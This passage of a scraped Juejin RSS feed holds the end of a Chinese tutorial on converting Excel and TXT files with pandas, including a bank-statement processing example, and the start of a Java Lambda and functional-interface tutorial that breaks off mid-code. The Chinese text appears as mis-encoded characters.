<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># è¯»å–æ—¶æŒ‡å®šä½ç²¾åº¦ç±»å‹</span>
<span class="hljs-attr">dtypes</span> = {<span class="hljs-string">'NumericCol'</span>: <span class="hljs-string">'float32'</span>, <span class="hljs-string">'ID'</span>: <span class="hljs-string">'int32'</span>}
<span class="hljs-attr">df</span> = pd.read_csv(<span class="hljs-string">'large.txt'</span>, sep=<span class="hljs-string">'\t'</span>, dtype=dtypes)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
<li>
<p>ä½¿ç”¨<code>dask</code>åº“å¤„ç†è¶…å¤§æ•°æ®ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">import dask.dataframe as dd

<span class="hljs-attr">ddf</span> = dd.read_csv(<span class="hljs-string">'huge_file.txt'</span>, sep=<span class="hljs-string">'\t'</span>)
ddf.to_excel('output.xlsx', <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>)  <span class="hljs-comment"># å®é™…ä¼šåˆ†å—å¤„ç†</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
</ol>
<hr/>
<h2 data-id="heading-16">äº”ã€å®Œæ•´æ¡ˆä¾‹ï¼šè´¢åŠ¡å¯¹è´¦å•å¤„ç†ç³»ç»Ÿ</h2>
<p>æŸä¼ä¸šéœ€è¦æ¯æ—¥å¤„ç†é“¶è¡Œå¯¼å‡ºçš„TXTå¯¹è´¦å•ï¼ˆå›ºå®šæ ¼å¼ï¼‰å¹¶ç”ŸæˆExcelåˆ†ææŠ¥è¡¨ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">import pandas as pd
from datetime import datetime

def process_bank_statement(txt_path):
    <span class="hljs-comment"># è‡ªå®šä¹‰è¯»å–å‡½æ•°ï¼ˆå¤„ç†å›ºå®šå®½åº¦ï¼‰</span>
    def parse_line(line):
        return {
            'date': line<span class="hljs-section">[0:8]</span>,
            'type': line<span class="hljs-section">[8:12]</span>,
            'amount': float(line<span class="hljs-section">[12:22]</span>)/100,
            'balance': float(line<span class="hljs-section">[22:32]</span>)/100,
            'remark': line<span class="hljs-section">[32:]</span>.strip()
        }
    
    <span class="hljs-comment"># è¯»å–TXT</span>
    with open(txt_path, 'r', <span class="hljs-attr">encoding</span>=<span class="hljs-string">'gbk'</span>) as f:
        <span class="hljs-attr">lines</span> = f.readlines()[<span class="hljs-number">1</span>:]  <span class="hljs-comment"># è·³è¿‡è¡¨å¤´</span>
    
    <span class="hljs-attr">data</span> = [parse_line(line) for line in lines if line.strip()]
    <span class="hljs-attr">df</span> = pd.DataFrame(data)
    
    <span class="hljs-comment"># è½¬æ¢æ—¥æœŸæ ¼å¼</span>
    df<span class="hljs-section">['date']</span> = pd.to_datetime(df<span class="hljs-section">['date']</span>, <span class="hljs-attr">format</span>=<span class="hljs-string">'%Y%m%d'</span>)
    
    <span class="hljs-comment"># æ·»åŠ åˆ†æåˆ—</span>
    df<span class="hljs-section">['day_of_week']</span> = df<span class="hljs-section">['date']</span>.dt.day_name()
    df<span class="hljs-section">['amount_category']</span> = pd.cut(df<span class="hljs-section">['amount']</span>, 
                                  <span class="hljs-attr">bins</span>=[-<span class="hljs-number">1</span>e6, -<span class="hljs-number">1000</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1000</span>, <span class="hljs-number">1</span>e6],
                                  <span class="hljs-attr">labels</span>=[<span class="hljs-string">'å¤§é¢æ”¯å‡º'</span>,<span class="hljs-string">'æ”¯å‡º'</span>,<span class="hljs-string">'æ”¶å…¥'</span>,<span class="hljs-string">'å¤§é¢æ”¶å…¥'</span>])
    
    <span class="hljs-comment"># ä¿å­˜Excel</span>
    <span class="hljs-attr">output_path</span> = f<span class="hljs-string">"processed_{datetime.now().strftime('%Y%m%d')}.xlsx"</span>
    with pd.ExcelWriter(output_path) as writer:
        df.to_excel(writer, <span class="hljs-attr">sheet_name</span>=<span class="hljs-string">'åŸå§‹æ•°æ®'</span>, index=<span class="hljs-literal">False</span>)
        
        <span class="hljs-comment"># æ·»åŠ æ±‡æ€»è¡¨</span>
        <span class="hljs-attr">summary</span> = df.groupby([<span class="hljs-string">'day_of_week'</span>, <span class="hljs-string">'amount_category'</span>]).size().unstack()
        summary.to_excel(writer, <span class="hljs-attr">sheet_name</span>=<span class="hljs-string">'æ±‡æ€»åˆ†æ'</span>)
    
    return output_path

<span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-attr">processed_file</span> = process_bank_statement(<span class="hljs-string">'bank_statement.txt'</span>)
print(f"å¤„ç†å®Œæˆï¼Œç»“æœå·²ä¿å­˜è‡³ï¼š{processed_file}")
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>å¤„ç†æ•ˆæœ</strong>ï¼š</p>
<ul>
<li>åŸå§‹TXTï¼ˆ3MBï¼‰â†’ åˆ†æå‹Excelï¼ˆ1.2MBï¼‰</li>
<li>å¤„ç†æ—¶é—´ï¼š4.7ç§’ï¼ˆå«æ•°æ®åˆ†æï¼‰</li>
<li>è‡ªåŠ¨ç”Ÿæˆå¯è§†åŒ–å‹å¥½çš„å¤šSheetæŠ¥è¡¨</li>
</ul>
<hr/>
<h2 data-id="heading-17">ç»“è¯­ï¼šé€‰æ‹©é€‚åˆçš„å·¥å…·é“¾</h2>
<p>Pythonçš„æ•°æ®è½¬æ¢æ–¹æ¡ˆé€‰æ‹©æŒ‡å—ï¼š</p>



































<table><thead><tr><th>éœ€æ±‚åœºæ™¯</th><th>æ¨èæ–¹æ¡ˆ</th><th>æ€§èƒ½ç­‰çº§</th></tr></thead><tbody><tr><td>ç®€å•Excelâ†”TXTè½¬æ¢</td><td>pandasåŸºç¡€æ–¹æ³•</td><td>â˜…â˜…â˜…â˜…â˜†</td></tr><tr><td>å¤šSheet/å¤æ‚æ ¼å¼</td><td>è‡ªå®šä¹‰è§£æ+pandas</td><td>â˜…â˜…â˜…â˜†â˜†</td></tr><tr><td>è¶…å¤§æ–‡ä»¶ï¼ˆ&gt;1GBï¼‰</td><td>dask/åˆ†å—å¤„ç†</td><td>â˜…â˜…â˜…â˜…â˜†</td></tr><tr><td>é«˜é¢‘å®æ—¶è½¬æ¢</td><td>ç»“åˆç¼“å­˜çš„å¢é‡å¤„ç†</td><td>â˜…â˜…â˜…â˜†â˜†</td></tr><tr><td>ä¼ä¸šçº§éƒ¨ç½²</td><td>FastAPIå°è£…ä¸ºå¾®æœåŠ¡</td><td>â˜…â˜…â˜…â˜…â˜…</td></tr></tbody></table>
<p>å¯¹äºå¤§å¤šæ•°ä¸­å°è§„æ¨¡æ•°æ®å¤„ç†éœ€æ±‚ï¼Œpandasæä¾›çš„æ–¹æ¡ˆå·²ç»è¶³å¤Ÿé«˜æ•ˆã€‚å½“æ•°æ®é‡è¶…è¿‡å†…å­˜å®¹é‡æ—¶ï¼Œå†è€ƒè™‘ä½¿ç”¨daskæˆ–åˆ†å—å¤„ç†æŠ€æœ¯ã€‚è®°ä½ï¼šä¼˜åŒ–å‰å…ˆæµ‹é‡æ€§èƒ½ç“¶é¢ˆï¼Œé¿å…è¿‡æ—©ä¼˜åŒ–ã€‚</p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java Lambdaè¡¨è¾¾å¼ä¸å‡½æ•°å¼ç¼–ç¨‹æ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7582311711429181483</link>    <guid>https://juejin.cn/post/7582311711429181483</guid>    <pubDate>2025-12-11T07:39:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582311711429181483" data-draft-id="7582311711429132331" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java Lambdaè¡¨è¾¾å¼ä¸å‡½æ•°å¼ç¼–ç¨‹æ·±åº¦è§£æ"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-11T07:39:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java Lambdaè¡¨è¾¾å¼ä¸å‡½æ•°å¼ç¼–ç¨‹æ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:39:44.000Z" title="Thu Dec 11 2025 07:39:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.7;font-weight:400;font-size:16px;overflow-x:hidden;color:#212122}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:8px;padding-bottom:8px}.markdown-body h1{color:#a0a0a0;font-size:38px;margin-top:32px;padding-top:32px}.markdown-body h2{color:#fff;background-color:#212122;width:fit-content;border-bottom-right-radius:100px;margin-top:47px;margin-bottom:16px;padding:4px 48px 4px 8px;line-height:1.7;font-size:30px;transition:all .3s ease-out}.markdown-body h2:hover{border-bottom-right-radius:50px;transition:all .3s ease-out}.markdown-body h3{font-size:24px;padding-left:8px;margin-top:32px;border-bottom:2px solid #c6c4c4;line-height:1.7}.markdown-body h4{font-size:20px;padding-left:8px;margin-top:32px;border-bottom:1px solid #ddd}.markdown-body h5{font-size:16px;margin-top:24px}.markdown-body h6{margin-top:16px;line-height:1.1}.markdown-body p{font-size:16px;text-align:start;white-space:normal;text-size-adjust:auto;line-height:2;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%;margin:auto;padding-left:8px;padding-right:8px}.markdown-body hr{border:none;border-top:4px double #212122;margin-top:32px;margin-bottom:32px;text-align:center}.markdown-body hr:after{content:"â™¥";display:inline-block;position:relative;top:-15px;padding:0 10px;color:#212122;font-size:18px}.markdown-body code{word-break:break-word;overflow-x:auto;background-color:#f1f1f1;color:#ef7060;font-size:14px;padding:.065em 6px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.7;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);margin:32px 16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-color:#212122;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);background-size:40px}.markdown-body pre&gt;code{font-size:14px;padding:16px 8px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#fff;background:#272822}.markdown-body pre&gt;code::-webkit-scrollbar{height:10px;background-color:#f5f5f5}.markdown-body pre&gt;code::-webkit-scrollbar-track{box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:3px;background-color:#f5f5f5}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{border-radius:3px;box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#555}.markdown-body a{color:#ef7060;padding:2px;text-decoration:none;border-bottom:.125em solid #ef7060;border-radius:2px;box-shadow:inset 0 -.025em 0 #ef7060;transition:box-shadow .27s cubic-bezier(.77,0,.175,1),color .27s cubic-bezier(.77,0,.175,1)}.markdown-body a:focus,.markdown-body a:hover{outline:none;box-shadow:inset 0 -1.5em 0 #ef7060;color:#fff}.markdown-body a:before{content:"â‡² ";vertical-align:top;margin-left:2px;font-family:dart!important;font-size:12px;color:inherit;opacity:.7}.markdown-body table{background:#fbfbfb;border-radius:4px;border-collapse:collapse;margin:auto;padding:5px;width:95%;box-shadow:0 5px 10px rgba(0,0,0,.1);animation:float 5s infinite}.markdown-body table th{color:#fff;background:#212122;border-bottom:1px solid #9ea7af;border-right:1px solid #343a45;font-size:18px;padding:16px;text-align:left;vertical-align:middle}.markdown-body table th:first-child{border-top-left-radius:4px}.markdown-body table th:last-child{border-top-right-radius:4px;border-right:none}.markdown-body table tr{border-top:1px solid #c1c3d1;border-bottom:1px solid #c1c3d1;color:#666b85}.markdown-body table tr:hover td{background:#212122;color:#fff;border-top:1px solid #22262e}.markdown-body table tr:first-child{border-top:none}.markdown-body table tr:last-child{border-bottom:none}.markdown-body table tr:nth-child(odd) td{background:#f1f1f1}.markdown-body table tr:nth-child(odd):hover td{background:#212122}.markdown-body table tr:last-child td:first-child{border-bottom-left-radius:4px}.markdown-body table tr:last-child td:last-child{border-bottom-right-radius:4px}.markdown-body table td{background:#fbfbfb;padding:16px;text-align:left;vertical-align:middle;font-size:16px;border-right:1px solid #c1c3d1}.markdown-body table td:last-child{border-right:0}.markdown-body blockquote{color:#777;padding:1px 16px;margin:24px 0;border-left:4px solid #c6c4c4;background-color:#f1f1f1;transition:all .3s ease-out;border-radius:4px}.markdown-body blockquote:hover{border-left-color:#212122;background-color:#212122;color:#fff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:24px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body span.math{margin-left:32px;font-size:18px;font-weight:700}@media (max-width:720px){.markdown-body h1{font-size:30.4px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å¼•è¨€ï¼šJavaçš„å‡½æ•°å¼ç¼–ç¨‹é©å‘½</h2>
<p>åœ¨Java 8ä¹‹å‰ï¼ŒJavaä¸€ç›´è¢«è¯Ÿç—…ä¸º"è¿‡äºå†—é•¿"çš„è¯­è¨€ã€‚å‡½æ•°å¼ç¼–ç¨‹çš„å¼•å…¥å½»åº•æ”¹å˜äº†è¿™ä¸€å±€é¢ï¼Œè®©Javaä»£ç å˜å¾—æ›´åŠ ç®€æ´ã€è¡¨è¾¾åŠ›æ›´å¼ºã€‚Lambdaè¡¨è¾¾å¼ä¸ä»…ä»…æ˜¯è¯­æ³•ç³–ï¼Œå®ƒä»£è¡¨äº†Javaç¼–ç¨‹èŒƒå¼çš„ä¸€æ¬¡é‡å¤§è½¬å˜ã€‚</p>
<h2 data-id="heading-1">Lambdaè¡¨è¾¾å¼åŸºç¡€ï¼šä»åŒ¿åç±»åˆ°Lambda</h2>
<h3 data-id="heading-2">ä¼ ç»Ÿçš„åŒ¿åå†…éƒ¨ç±»</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Java 8ä¹‹å‰çš„æ–¹å¼</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TraditionalExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// åˆ›å»ºRunnableçš„åŒ¿åå®ç°</span>
        <span class="hljs-type">Runnable</span> <span class="hljs-variable">runnable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                System.out.println(<span class="hljs-string">"ä¼ ç»Ÿæ–¹å¼ï¼šçº¿ç¨‹è¿è¡Œä¸­..."</span>);
            }
        };
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(runnable);
        thread.start();
    }
}
</code></pre>
<h3 data-id="heading-3">Lambdaè¡¨è¾¾å¼ç®€åŒ–</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Java 8 Lambdaè¡¨è¾¾å¼</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LambdaExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// ä½¿ç”¨Lambdaè¡¨è¾¾å¼</span>
        <span class="hljs-type">Runnable</span> <span class="hljs-variable">runnable</span> <span class="hljs-operator">=</span> () -&gt; System.out.println(<span class="hljs-string">"Lambdaæ–¹å¼ï¼šçº¿ç¨‹è¿è¡Œä¸­..."</span>);
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(runnable);
        thread.start();
        
        <span class="hljs-comment">// ç”šè‡³å¯ä»¥æ›´ç®€æ´</span>
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; System.out.println(<span class="hljs-string">"æœ€ç®€Lambdaè¡¨è¾¾å¼"</span>)).start();
    }
}
</code></pre>
<h2 data-id="heading-4">å‡½æ•°å¼æ¥å£ï¼šLambdaçš„ç±»å‹åŸºç¡€</h2>
<h3 data-id="heading-5">ä»€ä¹ˆæ˜¯å‡½æ•°å¼æ¥å£ï¼Ÿ</h3>
<p>å‡½æ•°å¼æ¥å£æ˜¯åªæœ‰ä¸€ä¸ªæŠ½è±¡æ–¹æ³•çš„æ¥å£ï¼Œå¯ä»¥ä½¿ç”¨<code>@FunctionalInterface</code>æ³¨è§£æ ‡è®°ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªå®šä¹‰å‡½æ•°å¼æ¥å£</span>
<span class="hljs-meta">@FunctionalInterface</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-type">int</span> <span class="hljs-title function_">calculate</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>;
    
    <span class="hljs-comment">// å¯ä»¥æœ‰é»˜è®¤æ–¹æ³•</span>
    <span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printResult</span><span class="hljs-params">(<span class="hljs-type">int</span> result)</span> {
        System.out.println(<span class="hljs-string">"ç»“æœï¼š"</span> + result);
    }
    
    <span class="hljs-comment">// å¯ä»¥æœ‰é™æ€æ–¹æ³•</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> {
